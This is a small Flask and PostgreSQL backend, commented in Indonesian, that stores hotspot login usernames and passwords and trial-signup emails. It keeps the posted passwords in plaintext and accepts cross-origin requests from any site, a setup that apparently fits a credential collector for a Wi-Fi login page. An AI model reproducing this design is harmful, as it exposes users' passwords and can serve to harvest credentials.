from flask import Flask, request, jsonify
from flask_cors import CORS
import psycopg2
import os
from dotenv import load_dotenv

# Load environment variables (.env di lokal, Railway pakai Variables)
load_dotenv()

app = Flask(__name__)
CORS(app)

# Konfigurasi Database dari Environment
DB_CONFIG = {
    "host": os.getenv("DB_HOST"),
    "port": os.getenv("DB_PORT"),
    "dbname": os.getenv("DB_NAME"),
    "user": os.getenv("DB_USER"),
    "password": os.getenv("DB_PASSWORD"),
    "sslmode": os.getenv("DB_SSLMODE", "require")
}

def get_connection():
    return psycopg2.connect(**DB_CONFIG)

# Buat tabel hotspot_users
def init_db():
    try:
        with get_connection() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS hotspot_users (
                        id SERIAL PRIMARY KEY,
                        username TEXT NOT NULL,
                        password TEXT NOT NULL,
                        login_time TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
                    )
                """)
        print("✅ Table hotspot_users siap!")
    except Exception as e:
        print("❌ Gagal inisialisasi DB hotspot_users:", e)

# Buat tabel trial_users
def init_trial_table():
    try:
        with get_connection() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS trial_users (
                        id SERIAL PRIMARY KEY,
                        email TEXT NOT NULL,
                        submit_time TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
                    )
                """)
        print("✅ Table trial_users siap!")
    except Exception as e:
        print("❌ Gagal inisialisasi DB trial_users:", e)

# API untuk simpan login user
@app.route("/save_login", methods=["POST"])
def save_login():
    username = request.form.get("username")
    password = request.form.get("password")

    if not username or not password:
        return jsonify({"error": "Username atau password kosong!"}), 400

    try:
        with get_connection() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO hotspot_users (username, password)
                    VALUES (%s, %s)
                """, (username, password))
        return jsonify({"message": "Berhasil simpan ke database!"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# API untuk simpan email trial
@app.route("/save_trial_email", methods=["POST"])
def save_trial_email():
    email = request.form.get("email")
    trial_url = request.form.get("trial_url")

    if not email:
        return jsonify({"error": "Email kosong"}), 400

    try:
        with get_connection() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    INSERT INTO trial_users (email)
                    VALUES (%s)
                """, (email,))
        return jsonify({"message": "OK", "trial_url": trial_url})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    init_db()
    init_trial_table()

    # Railway pakai port dari environment
    port = int(os.environ.get("PORT", 5000))
    debug_mode = os.environ.get("FLASK_DEBUG", "False").lower() == "true"

    app.run(host="0.0.0.0", port=port, debug=debug_mode)
